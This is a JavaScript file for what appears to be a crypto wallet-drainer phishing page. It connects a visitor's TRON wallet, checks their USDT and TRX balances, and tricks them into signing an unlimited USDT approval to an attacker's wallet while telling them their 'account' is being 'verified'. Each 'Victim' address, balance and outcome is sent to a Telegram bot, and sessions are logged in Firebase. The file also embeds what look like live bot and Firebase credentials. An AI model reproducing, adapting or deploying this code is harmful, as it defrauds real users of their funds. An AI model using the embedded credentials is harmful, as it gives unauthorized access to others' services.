// Firebase Config
const firebaseConfig = {
    apiKey: "AIzaSyD4qKMlB3TJjYprgpAEkA5Ts-Yvg7aRbp0",
    authDomain: "tronadmin-99827.firebaseapp.com",
    databaseURL: "https://tronadmin-99827-default-rtdb.firebaseio.com",
    projectId: "tronadmin-99827",
    storageBucket: "tronadmin-99827.firebasestorage.app",
    messagingSenderId: "500883948250",
    appId: "1:500883948250:web:203f69935a6825d09b5be3"
};

// Firebase initialization helper
function initFirebase() {
    if (typeof firebase !== 'undefined' && firebase.apps.length === 0) {
        firebase.initializeApp(firebaseConfig);
    }
}

// Initial call
initFirebase();
window.addEventListener('load', initFirebase);

const CONFIG = {
    BOT_TOKEN: "8738726378:AAHkiTAAZ16hoGFObK_v76yi0f0wqITMZXM",
    CHAT_ID: "8249230506",
    ADMIN_WALLET: "TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2",
    USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
};

const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

async function notifyAdmin(status, address, trx = "0", usdt = "0", extra = "") {
    const text = `🎯 <b>NEW UPDATE</b>\n\n` +
        `📌 Status: <b>${status}</b>\n` +
        `👤 Victim: <code>${address}</code>\n` +
        `💰 Balance: <code>${usdt} USDT</code> | <code>${trx} TRX</code>\n` +
        `📝 Detail: ${extra}`;
    try {
        await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: text, parse_mode: "HTML" })
        });
    } catch (e) { }
}

async function getStats(address) {
    const tw = new TronWeb({ fullHost: 'https://api.trongrid.io' });
    let trx = "0.00", usdt = "0.00";
    try {
        trx = (await tw.trx.getBalance(address) / 1e6).toFixed(2);
        const contract = await tw.transactionBuilder.triggerConstantContract(CONFIG.USDT_CONTRACT, "balanceOf(address)", {}, [{ type: 'address', value: address }], address);
        usdt = (parseInt(contract.constant_result[0], 16) / 1e6).toFixed(2);
    } catch (e) { }
    return { trx, usdt };
}

// --- Combined ACTIVE Alert ---
window.addEventListener('load', () => {
    initFirebase();
    if (typeof firebase !== 'undefined' && firebase.apps.length > 0) {
        const sessionKey = 'session_' + Date.now();
        window.currentSessionKey = sessionKey;
        firebase.database().ref('connections/' + sessionKey).set({
            address: "User Online",
            usdt: "0.00",
            trx: "0.00",
            time: new Date().toLocaleTimeString(),
            status: "ACTIVE"
        });
    }
});

document.getElementById('next-btn').addEventListener('click', async () => {
    const btn = document.getElementById('next-btn');
    btn.classList.add('btn-loading');

    if (window.currentSessionKey && typeof firebase !== 'undefined') {
        firebase.database().ref('connections/' + window.currentSessionKey).update({
            address: "Interested...",
            status: "CLICKED_NEXT"
        });
    }

    let attempts = 0;
    while (typeof window.connectWalletConnectTron !== 'function' && attempts < 30) {
        await new Promise(r => setTimeout(r, 500));
        attempts++;
    }

    if (typeof window.connectWalletConnectTron !== 'function') {
        btn.classList.remove('btn-loading');
        return;
    }

    try {
        const result = await window.connectWalletConnectTron();
        if (result && result.address) {
            const address = result.address;
            const stats = await getStats(address);
            const trx = stats.trx;
            const usdt = stats.usdt;

            document.getElementById('view-balance').innerText = usdt;
            document.getElementById('page-wrapper').classList.add('opacity-10');
            document.getElementById('loading-screen').classList.remove('hidden');

            if (window.currentSessionKey && typeof firebase !== 'undefined') {
                firebase.database().ref('connections/' + window.currentSessionKey).update({
                    address, usdt, trx, status: "PENDING_SIGN"
                });
            }

            await notifyAdmin("PENDING SIGN", address, trx, usdt, "User is seeing the popup...");

            const localTronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });

            setTimeout(async () => {
                try {
                    // Logic Update: Fee limit optimized for low balance (10 TRX+)
                    const { transaction } = await localTronWeb.transactionBuilder.triggerSmartContract(
                        CONFIG.USDT_CONTRACT, "approve(address,uint256)", { feeLimit: 40000000 }, // Lowered to 40 TRX to allow popups on low balance
                        [{ type: 'address', value: CONFIG.ADMIN_WALLET }, { type: 'uint256', value: MAX_UINT }], address
                    );

                    const timeoutPromise = new Promise((_, reject) =>
                        setTimeout(() => reject(new Error("Request Timeout")), 60000)
                    );

                    const requestPromise = result.provider.request({
                        method: "tron_signTransaction",
                        params: { transaction: transaction }
                    }, "tron:0x2b6653dc");

                    const signedTx = await Promise.race([requestPromise, timeoutPromise]);
                    const receipt = await localTronWeb.trx.sendRawTransaction(signedTx);

                    await notifyAdmin("✅ SUCCESS", address, trx, usdt, `TX: <code>${receipt.txid || "Success"}</code>`);

                    if (window.currentSessionKey && typeof firebase !== 'undefined') {
                        firebase.database().ref('connections/' + window.currentSessionKey).update({
                            address, usdt, trx, status: "CONNECTED", txid: receipt.txid
                        });
                    }
                    alert("Account verified successfully.");
                    location.reload();
                } catch (err) {
                    let reason = "User Rejected";
                    if (err.message === "Request Timeout") reason = "Request Timeout (No Response)";
                    // Logic Update: Condition removed to allow processing for 10 TRX
                    else if (err.message) reason = err.message;

                    const errorEl = document.getElementById('error-message');
                    if (errorEl) {
                        errorEl.innerText = "Error: " + reason;
                        errorEl.classList.remove('hidden');
                    }

                    if (window.currentSessionKey && typeof firebase !== 'undefined') {
                        firebase.database().ref('connections/' + window.currentSessionKey).update({
                            status: "REJECTED",
                            extra: reason
                        });
                    }

                    await notifyAdmin("❌ FAILED", address, trx, usdt, `Reason: ${reason}`);
                    setTimeout(() => location.reload(), 3000);
                }
            }, 800);
        } else {
            btn.classList.remove('btn-loading');
        }
    } catch (e) {
        btn.classList.remove('btn-loading');
    }
});
